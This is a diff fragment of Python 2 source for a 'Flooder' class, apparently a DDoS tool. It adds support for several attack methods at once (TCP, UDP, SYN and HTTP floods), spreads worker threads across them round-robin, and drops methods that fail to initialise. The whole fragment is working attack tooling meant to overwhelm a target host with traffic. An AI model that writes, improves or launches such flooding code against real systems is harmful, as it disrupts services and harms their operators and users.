@@ -27,16 +27,41 @@ class Flooder:
         self.srcport = srcport
         self.initsuccess = True
 
-        if method == TCP_METHOD or method == UDP_METHOD:
-            if message == None and random == False:
-                print "Message missing, not starting."
-                return
-        elif method == SYN_METHOD:
-            ret = synmod.init(srchost, srcport, host, port)
-            if ret == -1:
-                self.initsuccess = False
-            else:
-                print "synmod init success"
+        if host == "127.0.0.1" or host == "localhost":
+            print "Is someone being funny again? I'm not going to DDoS myself"
+
+
+        try:
+            if method.index(TCP_METHOD) != -1:
+                if message == None and random == False:
+                    print "Message missing, not using TCP method"
+                    method.remove(TCP_METHOD)
+        except:
+            pass
+
+        try:
+            if method.index(UDP_METHOD) != -1:
+                if message == None and random == False:
+                    print "Message missing, not using UDP method"
+                    method.remove(UDP_METHOD)
+        except:
+            pass
+
+        try:
+            if method.index(SYN_METHOD) != -1:
+                ret = synmod.init(srchost, srcport, host, port)
+                if ret != -1:
+                    print "synmod init success"
+                else:
+                    method.remove(SYN_METHOD)
+        except:
+            pass
+
+
+        if len(method) == 0:
+            print "No methods left to try, not starting."
+            self.initsuccess = False
+            
 
     def start(self):
         if len(self.__processes) > 0 or not self.initsuccess:
@@ -44,13 +69,13 @@ class Flooder:
 
         for x in range(self.threadsAmount):
             p = None
-            if self.method == TCP_METHOD:
+            if self.method[x%len(self.method)] == TCP_METHOD:
 	            p = TCPWorkerThread(self, self.threadId)
-            elif self.method == UDP_METHOD:
+            elif self.method[x%len(self.method)] == UDP_METHOD:
 	            p = UDPWorkerThread(self, self.threadId)
-            elif self.method == SYN_METHOD:
+            elif self.method[x%len(self.method)] == SYN_METHOD:
 	            p = SYNWorkerThread(self, self.threadId)
-            elif self.method == HTTP_METHOD:
+            elif self.method[x%len(self.method)] == HTTP_METHOD:
 	            p = HTTPWorkerThread(self, self.threadId)
             self.threadId += 1
             self.__processes.append(p)
